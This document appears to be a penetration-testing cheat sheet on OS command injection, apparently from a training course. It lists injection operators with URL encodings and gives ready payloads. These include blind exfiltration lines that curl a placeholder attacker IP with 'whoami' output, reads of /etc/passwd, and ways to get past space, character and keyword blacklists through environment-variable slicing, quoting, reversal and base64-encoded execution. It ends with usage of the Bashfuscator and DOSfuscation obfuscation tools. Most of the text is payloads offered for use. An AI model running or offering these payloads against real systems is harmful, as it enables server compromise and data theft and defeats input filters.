# Command Injection

A Command Injection vulnerability is among the most critical types of vulnerabilities. It allows us to execute system commands directly on the back-end hosting server, which could lead to compromising the entire network. If a web application uses user-controlled input to execute a system command on the back-end server to retrieve and return specific output, we may be able to inject a malicious payload to subvert the intended command and execute our commands.

## Detection & Exploitation

The process of detecting basic OS Command Injection vulnerabilities is the same process for exploiting such vulnerabilities. We attempt to append our command through various injection methods. If the command output changes from the intended usual result, we have successfully exploited the vulnerability.

**Command Injection Methods**

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                                         |
|--------------------|---------------------|-----------------------|----------------------------------------------------------|
| Semicolon          | ;                   | %3b                   | Both                                                     |
| New Line           | \n                  | %0a                   | Both                                                     |
| Background         | &                   | %26                   | Both (second output generally shown first)               |
| Pipe               | \|                  | %7c                   | Both (only second output is shown)                       |
| AND                | &&                  | %26%26                | Both (only if first succeeds)                            |
| OR                 | \|\|                 | %7c%7c                | Second (only if first fails)                             |
| Sub-Shell          | ``                  | %60%60                | Both (Linux-only)                                        |
| Sub-Shell          | $()                  | %24%28%29             | Both (Linux-only)                                        |

````
Tip: In addition to the above, there are a few unix-only operators, that would work on Linux and macOS, but would not work on Windows, such as wrapping our injected command with double backticks (``) or with a sub-shell operator ($()).

Note: The only exception may be the semi-colon ;, which will not work if the command was being executed with Windows Command Line (CMD), but would still work if it was being executed with Windows PowerShell.
````

**Example of Injections**
````
127.0.0.1; whoami
127.0.0.1%3b whoami
127.0.0.1 && whoami
127.0.0.1 || whoami
127.0.0.1; curl http://<OUR_IP>/ (Blind)
127.0.0.1; curl http://<OUR_IP>/$(whoami) (Blind)
````

## Filter Evasion

First, we must identify which operators are being blocked from being allowed in the application, and we can see this from the different responses that the server gives us.

**Bypassing Space Filters**

Tabs

Using tabs (%09) instead of spaces is a technique that may work, as both Linux and Windows accept commands with tabs between arguments, and they are executed the same.
````
127.0.0.1;%09whoami
````
Using $IFS

Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments.
````
127.0.0.1;${IFS}whoami
````
Using Brace Expansion
````
127.0.0.1;{ls,-la}
````

**Bypassing Other Blacklisted Characters**

Linux

There are many techniques we can utilize to have slashes in our payload. One such technique we can use for replacing slashes (or any other character) is through Linux Environment Variables like we did with ${IFS}. While ${IFS} is directly replaced with a space, there's no such environment variable for slashes or semi-colons. However, these characters may be used in an environment variable, and we can specify start and length of our string to exactly match this character.
````
$ echo ${PATH:0:1}
/

127.0.0.1;cat ${PATH:0:1}etc${PATH:0:1}passwd
````

We can do the same with the $HOME or $PWD environment variables as well. We can also use the same concept to get a semi-colon character, to be used as an injection operator.
````
$ echo ${LS_COLORS:10:1}
;

127.0.0.1${LS_COLORS:10:1}whoami
````

Windows

The same concept works on Windows as well. For example, to produce a slash in Windows Command Line (CMD), we can echo a Windows variable (%HOMEPATH% -> \Users\student), and then specify a starting position (~6 -> \student), and finally specifying a negative end position, which in this case is the length of the username htb-student (-7 -> \) :

````
> echo %HOMEPATH:~6,-11%
\
````
Powershell
````
> $env:HOMEPATH[0]
\
````

**Bypassing Blacklisted Commands**

Windows and Linux
````
$ w'h'o'am'i
$ w"h"o"am"i

127.0.0.1%0aw'h'o'am'i
````
Linux Only
````
who$@ami
w\ho\am\i
````
Windows Only
````
who^ami
````

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space

### Advanced Command Obfuscation

**Case Manipulation**
````
> WhOaMi (Windows)
$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")   (Linux)
````

**Reversed Commands**
````
$ $(rev<<<'imaohw')  - Linux
> "whoami"[-1..-20] -join ''    (Windows)
> iex "$('imaohw'[-1..-20] -join '')"  (Windows)
````

**Encoded Commands**
````
$ bash<<<$(base64 -d<<<base64_encoded_command)   (Linux)
> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('base64_encoded_command')))"  (Windows)
````

## Evasion Tools

**Linux (Bashfuscator)**
````
$ git clone https://github.com/Bashfuscator/Bashfuscator
$ cd Bashfuscator
$ pip3 install setuptools==65
$ python3 setup.py install --user
$ ./bashfuscator -c 'cat /etc/passwd'
$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
````

**Windows (DOSfuscation)**
````
> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
> cd Invoke-DOSfuscation
> Import-Module .\Invoke-DOSfuscation.psd1
> SET COMMAND type C:\Users\student\Desktop\flag.txt
> encoding
````
